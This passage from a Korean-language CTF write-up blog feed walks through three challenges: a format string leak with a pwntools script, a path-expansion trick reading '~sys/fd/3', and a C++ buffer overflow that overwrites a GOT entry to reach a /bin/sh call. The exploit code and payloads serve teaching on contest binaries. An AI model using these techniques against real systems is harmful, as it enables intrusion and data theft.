class="string">&quot;%127[^\n]&quot;</span>, input);</span><br><span class="line">  <span class="built_in">printf</span>(input);                                <span class="comment">// fsb</span></span><br><span class="line">  sub_111191B0((<span class="type">int</span>)<span class="string">&quot;\nHope you got what you wanted!&quot;</span>);</span><br><span class="line">  sub_11118F10(off_111B9498);</span><br><span class="line">  result = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( __readgsdword(<span class="number">0x14</span>u) != v5 )</span><br><span class="line">    sub_11137030();</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>stripped fileÏù¥ÎùºÏÑú Ìï®ÏàòÎ™ÖÏù¥ Îã§ <code>sub_XX</code>Î°ú ÏãúÏûëÌïòÍ≥† ÏûàÏóàÎã§. Í∑∏ÎûòÏÑú Ïù¥Î¶ÑÏùÑ Ï°∞Í∏à Î∞îÍøîÏ§¨Îã§.</p><p><code>read_flag()</code> Ìï®ÏàòÏóêÏÑú flagÎ•º openÌï¥ÏÑú readÌïòÎäîÎç∞ Í∑∏ readÌïú Ï£ºÏÜåÎ•º Î∞òÌôòÌïúÎã§.</p><p>Í≤∞Íµ≠ flag ÏúÑÏπòÎ•º Ï∂úÎ†•Ìï¥Ï£ºÍ≥†, Ïö∞Î¶¨ÏóêÍ≤å inputÏùÑ Î∞õÎäîÎã§.</p><p>Ïó¨Í∏∞ÏÑú Ìè¨Ïù∏Ìä∏Îäî Ïö∞Î¶¨ inputÏùÑ printfÎ°ú Ï∂úÎ†•Ìï¥Ï§Ñ Îïå Ìè¨Îß∑ Ïä§Ìä∏ÎßÅ ÏóÜÏù¥ Ï∂úÎ†•ÏùÑ Ìï¥Ï§ÄÎã§Îäî Í≤ÉÏù¥Îã§. Í∑∏Îü¨Î©¥ <strong>fsb Ï∑®ÏïΩÏ†ê</strong>Ïù¥ Î∞úÏÉùÌïòÍ≤å ÎêúÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/lake/way_too_simple$ nc chall.polygl0ts.ch 16000</span><br><span class="line">The flag is at 0x12c1a420</span><br><span class="line">Input your magical spell! AAAA %p %p %p %p %p %p %p %p %p %p</span><br><span class="line">AAAA 0xffad03cc 0xffad0458 0x11111838 0x1118c5cf 0x32323032 0x2a 0x41414141 0x20702520 0x25207025 0x70252070</span><br><span class="line">Hope you got what you wanted!</span><br></pre></td></tr></table></figure><p>offsetÏùÄ 7ÏûÑÏùÑ Ïïå Ïàò ÏûàÎã§. </p><p>Ï∞∏Í≥†Î°ú 32bit ÌôòÍ≤ΩÏóêÏÑúÏùò fsb Ï∑®ÏïΩÏ†êÏóê ÎåÄÌïú ÎÇ¥Ïö©ÏùÄ ÎÇòÏùò <a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">Íµ¨ Ìã∞Ïä§ÌÜ†Î¶¨ Î∏îÎ°úÍ∑∏</a>Ïóê ÏûêÏÑ∏Ìûà ÏÑ§Î™ÖÎêòÏñ¥ ÏûàÎã§.</p><p><a href="https://jiravvit.tistory.com/entry/FSB-Format-String-Bug?category=899454">32bitÏóêÏÑú FSB (Format String Bug) Ïù¥Ìï¥ÌïòÍ∏∞ -(1)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-2?category=899454">32bitÏóêÏÑú FSB (Format String Bug) Ïù¥Ìï¥ÌïòÍ∏∞ -(2)</a><br><a href="https://jiravvit.tistory.com/entry/32bit%EC%97%90%EC%84%9C-FSB-Format-String-Bug-%EC%9D%B4%ED%95%B4%ED%95%98%EA%B8%B0-3?category=899454">32bitÏóêÏÑú FSB (Format String Bug) Ïù¥Ìï¥ÌïòÍ∏∞ -(3) (ÏôÑ)</a></p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">16000</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./exe&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">int</span>(<span class="string">&#x27;0x&#x27;</span> + p.recv(<span class="number">8</span>), <span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&#x27;flag address :: &#x27;</span> + <span class="built_in">hex</span>(flag))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">payload += p32(flag)</span><br><span class="line">payload += <span class="string">&quot;%7$s&quot;</span>    <span class="comment"># offset is 7</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;spell!&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*] flag address :: 0x12fe0420</span><br><span class="line"> \x04\x127$s</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">  \x04\x12PFL&#123;format_string_are_way_too_old&#125;</span><br><span class="line">Hope you got what you wanted!</span><br><span class="line">[*] Got EOF while reading in interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>flagÍ∞Ä Ïù¥Îü∞ÏãùÏúºÎ°ú Ï∂úÎ†•Ïù¥ ÎêòÎäîÎç∞, flag Ìè¨Îß∑Ïóê ÎßûÍ≤å Ï°∞Í∏à ÎßåÏ†∏Ï£ºÍ∏∞Îßå ÌïòÎ©¥ ÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EPFL&#123;format_string_are_way_too_old&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 32bit </tag>
            
            <tag> fsb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - readme2022 (misc)</title>
      <link href="/220928-cakectf2022-readme2022/"/>
      <url>/220928-cakectf2022-readme2022/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: ÏÜåÏä§ÏΩîÎìú(python)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;/flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-] Flag not found. If this message shows up&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;    on the remote server, please report to amdin.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    filepath = <span class="built_in">input</span>(<span class="string">&quot;filepath: &quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> filepath.startswith(<span class="string">&quot;/&quot;</span>):</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not start with &#x27;/&#x27;&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> filepath:</span><br><span class="line">        exit(<span class="string">&quot;[-] Filepath must not contain &#x27;..&#x27;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    filepath = os.path.expanduser(filepath)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">open</span>(filepath, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        exit(<span class="string">&quot;[-] Could not open file&quot;</span>)</span><br></pre></td></tr></table></figure><p>Ï†úÍ≥µÎêú server.py ÏÜåÏä§ÏΩîÎìú Ï†ÑÎ¨∏Ïù¥Îã§.</p><p>ÏΩîÎìúÎ•º ÏùΩÎã§Î≥¥Î©¥ Î≠îÍ∞Ä ÌïµÏã¨Ïù∏ Í≤É Í∞ôÏùÄ Î∂ÄÎ∂ÑÏùÑ Ï∞æÏùÑ Ïàò ÏûàÎã§.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filepath = os.path.expanduser(filepath)</span><br></pre></td></tr></table></figure><p><code>filepath</code>Ïóê <code>~&lt;username&gt;</code>Î•º ÏûÖÎ†•ÌïúÎã§Î©¥ home ÎîîÎ†âÌÜ†Î¶¨ pathÍ∞Ä Î∞îÎÄåÍ≤å ÎêòÎäîÎç∞ Ïù¥Í≤ÉÏùÑ Ïù¥Ïö©ÌïòÏó¨ Î¨∏Ï†úÎ•º Ìë∏Îäî Í≤ÉÏù¥Îã§.</p><p>ÏÜåÏä§ÏΩîÎìúÍ∞Ä Ï†úÍ≥µÎêòÏóàÏúºÎãàÍπå filepathÎ•º Ï∂úÎ†•Ìï¥ÏÑú ÌôïÏù∏Ìï¥Î≥¥Ïûê.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~</span><br><span class="line">/home/jir4vvit</span><br><span class="line">[-] Could not open file</span><br><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py </span><br><span class="line">filepath: ~test</span><br><span class="line">/home/test</span><br><span class="line">[-] Could not open file</span><br></pre></td></tr></table></figure><p>Ïù¥Îü∞ ÎäêÎÇåÏù¥Îã§..</p><p><code>/etc/passwd</code>ÏùÑ ÌôïÏù∏ÌïòÎ©¥ ÏïÑÎûòÏôÄ Í∞ôÏùÄ Ï†ïÎ≥¥Í∞Ä ÏûàÎäîÎç∞,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br></pre></td></tr></table></figure><p>sys ÏÇ¨Ïö©ÏûêÏùò home ÎîîÎ†âÌÜ†Î¶¨Í∞Ä <code>/dev</code>Ïù∏ Í≤ÉÏùÑ Ïïå Ïàò ÏûàÎã§.</p><p>ÎçîÎ∂àÏñ¥ Î¨∏Ï†úÏóêÏÑú <code>/flag.txt</code>Î•º openÌïòÍ≥† closeÌïòÏßÄ ÏïäÏïòÏùåÏúºÎ°ú file descriptorÍ∞Ä Í≥ÑÏÜç ÏÇ¥ÏïÑÏûàÏùåÏùÑ Ïïå Ïàò ÏûàÎã§. (!)</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jir4vvit@ubuntu:~/ctf/cake/readme2022$ python3 server.py</span><br><span class="line">filepath: ~sys/fd/3</span><br><span class="line">flag&#123;fake_flag&#125;</span><br></pre></td></tr></table></figure><p>ÏÑ§Î™ÖÏùÑ Ï°∞Í∏à Ï∂îÍ∞ÄÌïòÏûêÎ©¥, ÏßÄÍ∏à sys ÏÇ¨Ïö©ÏûêÏùò Ìôà ÎîîÎ†âÌÜ†Î¶¨Î°ú Î≥ÄÍ≤ΩÎêòÏóàÏúºÎãà <code>/dev</code>Í∞Ä filepath(homepath)Í∞Ä ÎêòÏóàÍ≥†, Ï†ïÌôïÌûàÎäî <code>/dev/fd/3</code>Ïóê Ï†ëÍ∑ºÌïú Í≤ÉÏù¥Îã§.</p><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>Í∞úÏù∏Ï†ÅÏúºÎ°ú Ïû¨ÎØ∏ÏûàÎäî Î¨∏Ï†úÎùºÍ≥† ÏÉùÍ∞ÅÎêòÏñ¥ Î∏îÎ°úÍ∑∏Ïóê Íº≠ Í∏∞Î°ùÌïòÍ≥† Ïã∂ÏóàÎã§.</p><p>ÏïÑ, File DescriptorÏóê ÎåÄÌïú ÏÑ§Î™ÖÏùÄ ÎÇòÏùò Í≥ºÍ±∞ <a href="https://jiravvit.tistory.com/entry/%ED%8C%8C%EC%9D%BC-%EB%94%94%EC%8A%A4%ED%81%AC%EB%A6%BD%ED%84%B0-File-Descriptor">Ìã∞Ïä§ÌÜ†Î¶¨ Î∏îÎ°úÍ∑∏</a>Ïóê ÏûàÎã§. „Öé</p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Cake </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CakeCTF 2022 - str.vs.cstr (cpp)</title>
      <link href="/220928-cakectf2022-str_vs_c.str/"/>
      <url>/220928-cakectf2022-str_vs_c.str/</url>
      
        <content type="html"><![CDATA[<p>Î∂ÑÏÑù ÌôòÍ≤Ω: Windows 11, Ubuntu 20.04<br>ÏÇ¨Ïö©Ïûê Ï†úÍ≥µ ÌååÏùº: Î∞îÏù¥ÎÑàÎ¶¨, ÏÜåÏä§ÏΩîÎìú(cpp)</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h3 id="Î≥¥Ìò∏-Í∏∞Î≤ï"><a href="#Î≥¥Ìò∏-Í∏∞Î≤ï" class="headerlink" title="Î≥¥Ìò∏ Í∏∞Î≤ï"></a>Î≥¥Ìò∏ Í∏∞Î≤ï</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><h3 id="Ï∑®ÏïΩÏ†ê"><a href="#Ï∑®ÏïΩÏ†ê" class="headerlink" title="Ï∑®ÏïΩÏ†ê"></a>Ï∑®ÏïΩÏ†ê</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">  <span class="built_in">Test</span>() &#123; std::<span class="built_in">fill</span>(_c_str, _c_str + <span class="number">0x20</span>, <span class="number">0</span>); &#125;</span><br><span class="line">  <span class="function"><span class="type">char</span>* <span class="title">c_str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _c_str; &#125;</span><br><span class="line">  <span class="function">std::string&amp; <span class="title">str</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> _str; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  __attribute__((used))</span><br><span class="line">  <span class="function"><span class="type">void</span> <span class="title">call_me</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::<span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> _c_str[<span class="number">0x20</span>];</span><br><span class="line">  std::string _str;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>Test Íµ¨Ï°∞Ï≤¥Ïóê 0x20 ÌÅ¨Í∏∞Ïùò <code>_c_str</code>Î•º Ï†ïÏùòÌï¥ÎÜ®Îã§.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>: <span class="comment">// set c_str</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;c_str: &quot;</span>;</span><br><span class="line">    std::cin &gt;&gt; test.<span class="built_in">c_str</span>();</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>Î¨∏Ï†ú Í∏∞Îä• Ï§ëÏóê <code>_c_str</code>Ïóê ÏûÖÎ†•ÌïòÎäî Î∂ÄÎ∂ÑÏù¥ ÏûàÎäîÎç∞, Ïù¥ Îïå <strong>ÏûÖÎ†•Í∞í ÌÅ¨Í∏∞Î•º Í≤ÄÏ¶ùÌïòÏßÄ ÏïäÏïÑ BOFÍ∞Ä Î∞úÏÉùÌï† Ïàò ÏûàÎã§.</strong></p><p>ÏïÑÏâΩÍ≤åÎèÑ(?) canaryÍ∞Ä Ï°¥Ïû¨ÌïòÏó¨ ROPÎäî Î∂àÍ∞ÄÎä•ÌïòÎã§.<br>ÌïòÏßÄÎßå <code>_c_str</code> Îí§Ïóê <code>std::string</code> Îç∞Ïù¥ÌÑ∞Î•º Í∞ÄÎ¶¨ÌÇ§Îäî Ïä§ÌÉù Ìè¨Ïù∏ÌÑ∞Í∞Ä Ï†ÄÏû•ÎêòÏñ¥ ÏûàÎã§.</p><p>ÎßàÏπ® <code>std::string</code> Îç∞Ïù¥ÌÑ∞Î•º getÌïòÍ±∞ÎÇò set(ÏûÖÎ†•)ÌïòÎäî Í∏∞Îä•Ïù¥ ÏûàÎäîÎç∞, Ïù¥ Îïå (<code>_c_str</code> Îí§Ïóê ÏúÑÏπòÌïú) Ìè¨Ïù∏ÌÑ∞Î•º Ïù¥Ïö©Ìï¥ÏÑú Ï†ëÍ∑ºÌïúÎã§.</p><p>Ïö∞Î¶¨Îäî Ïó¨Í∏∞ÏÑú GOT OverwritingÏùÑ ÌÜµÌï¥ ÏõêÌïòÎäî Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ¨ Ïàò ÏûàÎã§Îäî Í≤ÉÏùÑ ÎààÏπòÏ±å Ïàò ÏûàÎã§.</p><p><code>call_me</code>ÎùºÎäî Ï¢ãÏùÄ Ìï®ÏàòÍ∞Ä ÏûàÏúºÎãà Ï†ÅÎãπÌïú Ìï®ÏàòÎ•º Í≥®ÎùºÏÑú Ïñ¥Îñ†Ìïú gotÎ•º <code>call me</code> Î°ú ÎçÆÏñ¥Î≤ÑÎ¶¨Î©¥ Î∞îÎ°ú ÏâòÏùÑ Îî∏ Ïàò ÏûàÏùÑ Í≤É Í∞ôÎã§.</p><h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>Ïñ¥Îñ§ Ìï®Ïàò gotÎ•º <code>call_me</code>Î°ú ÎçÆÏùÑÍπå.. Í≥†ÎØºÏùÑ Ìï¥Î≥¥ÏïòÎã§.</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> choice = <span class="number">0</span>;</span><br><span class="line">std::cout &lt;&lt; <span class="string">&quot;choice: &quot;</span>;</span><br><span class="line">std::cin &gt;&gt; choice;</span><br></pre></td></tr></table></figure><p>Í∏∞Îä• ÏàòÌñâÏù¥ ÎÅùÏù¥ ÎÇòÎ©¥ Ïñ¥Îäê caseÎ¨∏ÏúºÎ°ú Í∞à ÏßÄ ÏûÖÎ†•ÏùÑ Î∞õÎäîÎç∞,<br>Ìï¥Îãπ Î∂ÄÎ∂ÑÏù¥ IDAÏóêÏÑú</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">choice = <span class="number">0</span>;</span><br><span class="line">std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;choice: &quot;</span>);</span><br><span class="line">std::istream::<span class="keyword">operator</span>&gt;&gt;(&amp;std::cin, &amp;choice);</span><br></pre></td></tr></table></figure><p>Ïù¥Î†áÍ≤å Î≥¥Ïó¨ÏßÄÍ≥† ÏûàÏóàÎã§.</p><p><code>std::char_traits</code>Ïùò gotÎ•º ÎçÆÏñ¥Î≤ÑÎ¶∞Îã§Î©¥..?</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_c_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_str</span>(<span class="params">s</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;: &#x27;</span>, s)</span><br><span class="line"></span><br><span class="line">set_c_str(<span class="string">&#x27;A&#x27;</span>*<span class="number">0x20</span> + p64(<span class="number">0x404048</span>)) <span class="comment"># _ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc</span></span><br><span class="line">set_str(p64(<span class="number">0x4016de</span>)) <span class="comment"># call_me</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p>Î¨∏Ï†ú ÌíÄ ÎãπÏãúÏóê Ïù¥Í≤ÉÏ†ÄÍ≤É Ìï¥Î≥¥Îã§Í∞Ä <code>std::string</code>Ïù¥ Ï†ÄÏû•ÎêòÎäî Íµ¨Ï°∞Í∞Ä Ï°∞Í∏à Ïù¥ÏÉÅÌïú Í≤ÉÎßå ÎäêÎÅºÍ≥† ÏûêÏÑ∏Ìûà Î≥¥ÏßÄÎäî ÏïäÏïòÏóàÎäîÎç∞.. ÏßÄÍ∏à Îã§Ïãú Î≥¥Îãà Í∑∏Îïå ÎäêÎÇÄ Í≤å ÌãÄÎ¶∞ Í≤ÉÏù¥ ÏïÑÎãàÏóàÏùåÏùÑ ÏïåÍ≤å ÎêòÏóàÎã§.</p><h3 id="std-string"><a href="#std-string" class="headerlink" title="std::string"></a>std::string</h3><p>Í∏∞Î≥∏ Íµ¨Ï°∞Îäî ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">+00h: &lt;Data Pointer&gt; </span><br><span class="line">+08h: &lt;Data Size&gt;</span><br><span class="line">+10h: &lt;Data&gt;  </span><br><span class="line">+18h: &lt;Data&gt;</span><br></pre></td></tr></table></figure><p>ÎîîÎ≤ÑÍ±∞Î°ú ÌôïÏù∏Ìï¥Î≥¥Î©¥ Îçî ÏßÅÍ¥ÄÏ†ÅÏúºÎ°ú ÌôïÏù∏Ìï† Ïàò ÏûàÎã§. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search AAAAAAAAAAAAAAA</span><br><span class="line">[stack]         0x7ffd35bb1700 &#x27;AAAAAAAAAAAAAAA&#x27;</span><br><span class="line">pwndbg&gt; x/4gx 0x7ffd35bb1700-0x10</span><br><span class="line">0x7ffd35bb16f0:0x00007ffd35bb17000x000000000000000f</span><br><span class="line">0x7ffd35bb1700:0x41414141414141410x0041414141414141</span><br></pre></td></tr></table></figure><p>Ìï¥Îãπ Î¨∏Ï†úÎ•º ÏòàÏãúÎ°ú Îì§ÏûêÎ©¥ Í∞í <code>0x00007ffd35bb1700</code>Í∞Ä Ï†ÄÏû•Îêú Ï£ºÏÜå <code>0x7ffd35bb16f0</code>Ïóê <code>std::char_traits</code>Ïùò gotÎ•º Ïì¥Îã§.<br>Í∑∏Î¶¨Í≥† Ìï¥Îãπ gotÏóêÎã§Í∞Ä <code>call_me</code>Î•º Ïì∞Î©¥(GOT overwriting), Í≤∞Î°†Ï†ÅÏúºÎ°ú <code>std::char_traits</code>Ïù¥ Ïã§ÌñâÎê† Îïå <code>call_me</code>Í∞Ä Ïã§ÌñâÎêúÎã§.</p><p>Îã§Ïãú Í∏∞Î≥∏ Íµ¨Ï°∞Î°ú ÎèåÏïÑÏôÄÏÑú..Data SizeÍ∞Ä 16(0x10) Ïù¥ÏÉÅÏù∏ Í≤ΩÏö∞Ïóî ÌäπÏù¥ÌïòÍ≤å ÌûôÏóê Ìï†ÎãπÎêúÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/4gx 0x7ffd375efe40</span><br><span class="line">0x7ffd375efe40:0x0000000001e23eb00x0000000000000010</span><br><span class="line">0x7ffd375efe50:0x000000000000001e0x0041414141414141</span><br><span class="line">pwndbg&gt; x/10gx 0x0000000001e23eb0 - 0x10</span><br><span class="line">0x1e23ea0:0x00000000000000000x0000000000000031</span><br><span class="line">0x1e23eb0:0x41414141414141410x4141414141414141</span><br><span class="line">0x1e23ec0:0x00000000000000000x0000000000000000</span><br><span class="line">0x1e23ed0:0x00000000000000000x000000000000f131</span><br><span class="line">0x1e23ee0:0x00000000000000000x0000000000000000</span><br></pre></td></tr></table></figure><h3 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h3><p>ÏÇ¨Ïã§ Ïù¥ Î¨∏Ï†úÏóêÏÑúÎäî (ÏùµÏä§ÌïòÎäîÎç∞ÏóêÎäî ÏïàÏçºÏßÄÎßå) Ï∂úÎ†•ÌïòÎäî Í∏∞Îä•ÎèÑ Ï°¥Ïû¨ÌïòÍ∏∞ ÎïåÎ¨∏Ïóê <code>std::string</code>Ïùò Í∏∞Î≥∏ Íµ¨Ï°∞Îßå Ï∂©Î∂ÑÌûà ÏïåÍ≥† ÏûàÎã§Î©¥ leakÎèÑ Í∞ÄÎä•ÌïòÎã§.</p><p><code>_c_str</code>Î•º ÏûÖÎ†•Ìï† Îïå BOFÎ•º Ïù¥Ïö©ÌïòÏó¨ Data PointerÏóê leakÌïòÍ≥† Ïã∂ÏùÄ Ï£ºÏÜå ÎÑ£Í≥† Î∞îÎ°ú 